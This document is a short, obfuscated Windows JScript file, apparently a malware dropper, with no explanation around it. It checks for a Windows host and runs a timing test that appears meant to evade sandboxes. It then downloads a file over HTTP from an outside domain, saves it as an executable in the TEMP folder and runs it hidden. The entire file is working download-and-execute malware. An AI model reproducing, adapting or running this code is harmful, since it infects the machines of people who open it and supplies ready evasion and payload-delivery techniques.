var zq = false;
var Ej = "CreateObject";
var DF = function PO() {return WScript[Ej]("WScript.Shell");}(), R = 11;
var p = "MSXML2.XMLHTTP";
var A0 = 2123213;
var m = 0;
function Ty(Rp){DF["Run"](Rp, m, m);};
function uf(){return "" + p;};
function i(U, I){m = m * 1; return U - I;};
function zR(){return Ej;};
/*@cc_on
  @if (@_win32 || @_win64)
    zq = true;
  @end
@*/
if (zq)
{
var N = "";
function A(){return 22;};
var X = 0; var E = 0;
function Al()
{
var Kv = new this["Date"]();
var dW = Kv["getUTCMilliseconds"]();
WScript["Sleep"](A());
var Kv = new this["Date"]();
var KV = Kv["getUTCMilliseconds"]();
WScript["Sleep"](A());
var Kv = new this["Date"]();
var BY = Kv["getUTCMilliseconds"]();
var X = "h";
X = i(KV, dW);
var E = "P";
E = i(BY, KV);
N = "open";
return i(X, E);
}
var J = false;
var zs = false;
for (var aj = m; aj < A() * 1; aj++){if (Al() != m){
J = true; 
E = "31" + 11 * X + E; 
zs = true; 
break;
}}
function y() {return ((J == true) && (J == zs)) ? 1 : m;};
if (J && y() && zs){
function As() {return DF["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Ed85L04GB.exe";};
 uR = uf();
 G = WScript[Ej](uR);
 var lL = 1;
 while (lL){
try {
G[N]("GET", "http://caferacerpneus.com.br/lw2osd", false);
G["send"]();
Ap = "Sleep";
for (;;){WScript[Ap](A() * 11); if (G["readystate"] >= 2 * 2) break;};
lL = m;
} catch(XJ){};
}
function M(T) {var nB = (1, 2, 3, 4, 5, T); return nB;};
Ox = WScript[zR()]("ADODB.Stream");
uR = Ox;
uR[N]();
uR["type"] = M(1);
uR["write"](G["ResponseBody"]);
Ox["position"] = M(m);
uR["Save" + "ToFile"](As(), 2);
Ox["c"+"lose"]();
ct = As();
Ty(ct);
}
}

